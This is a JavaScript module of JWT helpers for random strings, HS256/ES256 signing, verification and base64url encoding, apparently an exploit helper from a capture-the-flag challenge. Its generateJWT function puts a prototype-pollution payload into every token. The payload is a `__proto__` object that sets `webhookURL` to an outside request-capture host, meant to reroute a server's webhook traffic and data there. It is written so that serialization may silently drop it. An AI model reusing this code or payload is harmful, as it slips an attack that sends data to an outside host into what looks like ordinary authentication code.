const crypto = require("crypto").webcrypto;
const b64Lib = require("base64-arraybuffer");

const generateRandomString = (length) => {
  var q = "";
  for (var i = 0; i < length; i++) {
    q += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(
      ""
    )[parseInt((crypto.getRandomValues(new Uint8Array(1))[0] / 255) * 61)];
  }
  return q;
};

/**
 * 
 * @param {string} token JWT string to verify
 * @param {string} key provide a spki format publickey for ES256, string for HS256
 * @returns {Promise<boolean>} whether a token is valid or not
 */

const verifyJWT = async (token,key) => {

  var splited = token.split(".");

  let header = JSON.parse(new TextDecoder().decode(b64Lib.decode(decodeurlsafe(splited[0]))).replaceAll('\x00',''))


  if(header.typ !="JWT") {
    throw new Error("invalid typ")
  }

  if(header.alg == "ES256") {

    let publicKey = await crypto.subtle.importKey(
      "spki",
      b64Lib.decode(key),
      {name:"ECDSA", namedCurve:"P-256"},
      false,
      ["verify"]
    )
    let sig = b64Lib.decode(decodeurlsafe(splited[2]));

    let isValid = await crypto.subtle.verify(
      { name: "ECDSA", hash:"SHA-256" },
      publicKey,
      sig,
      new TextEncoder().encode(`${splited[0]}.${splited[1]}`)
    );
    return isValid;

  }else if(header.alg == "HS256"){
    let baseKey = await crypto.subtle.importKey(
      "raw",
      new TextEncoder().encode(key),
      { name: "HMAC", hash: "SHA-256" },
      false,
      ["verify"]
    );

    let sig = b64Lib.decode(decodeurlsafe(splited[2]));
    let isValid = await crypto.subtle.verify(
      { name: "HMAC" },
      baseKey,
      sig,
      new TextEncoder().encode(`${splited[0]}.${splited[1]}`)
    );
    return isValid;
  }

};

/**
 * 
 * @param {string} token JWT string to read
 * @param {string} key provide a spki format publickey for ES256, string for HS256
 * @returns {Promise<any>}
 */

const readJWT = async(token,key) =>{
  const decoder = new TextDecoder()
  const isVerified = await verifyJWT(token,key)
  console.log(isVerified)
  if(isVerified){
    let payload = token.split(".")[1]
    return JSON.parse(decoder.decode(b64Lib.decode(decodeurlsafe(payload))).replaceAll('\x00',''))
  }else{
    throw new Error("unknown JWT")
  }
}

/**
 * 
 * @param {"HS256"|"ES256"} alg JWT signature algorithm
 * @param {string} userId uid
 * @param {string} key provide a pkcs8 format privatekey for ES256, string for HS256
 * @returns {Promise<string>} generated JWT
 */

const generateJWT = async (alg, userId, key) => {
  const strEncoder = new TextEncoder();
  let headerData = urlsafe(
    b64Lib.encode(
      strEncoder.encode(JSON.stringify({ alg: alg, typ: "JWT" }))
    )
  );
  let payload = urlsafe(
    b64Lib.encode(
      strEncoder.encode(
        JSON.stringify({
          uid: userId,
          __proto__:{
            webhookURL: "https://eodxumeonkl064t.m.pipedream.net",
          }
        })
      )
    )
  );

  if(alg == "HS256") {
    let baseKey = await crypto.subtle.importKey(
      "raw",
      new TextEncoder().encode(key),
      { name: "HMAC", hash: "SHA-256" },
      false,
      ["sign"]
    );
  
    let sig = await crypto.subtle.sign(
      { name: "HMAC" },
      baseKey,
      new TextEncoder().encode(`${headerData}.${payload}`)
    );
  
    return `${headerData}.${payload}.${urlsafe(
      b64Lib.encode(new Uint8Array(sig))
    )}`;

  }else if (alg=="ES256") {
    let baseKey = await crypto.subtle.importKey(
      "pkcs8",
      b64Lib.decode(key),
      {name:"ECDSA", namedCurve:"P-256"},
      true,
      ["sign"]
    )
    let sig = await crypto.subtle.sign(
      { name: "ECDSA", hash:"SHA-256" },
      baseKey,
      new TextEncoder().encode(`${headerData}.${payload}`)
    );
    return `${headerData}.${payload}.${urlsafe(
      b64Lib.encode(new Uint8Array(sig))
    )}`;
  }
};

const urlsafe = (base) => {
  return base.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
};

const decodeurlsafe = (dat) => {
  dat += Array(5 - (dat.length % 4)).join("=");

  var data = dat.replace(/\-/g, "+").replace(/\_/g, "/");
  return data;
};

module.exports = {
  generateRandomString,
  readJWT,
  generateJWT,
};
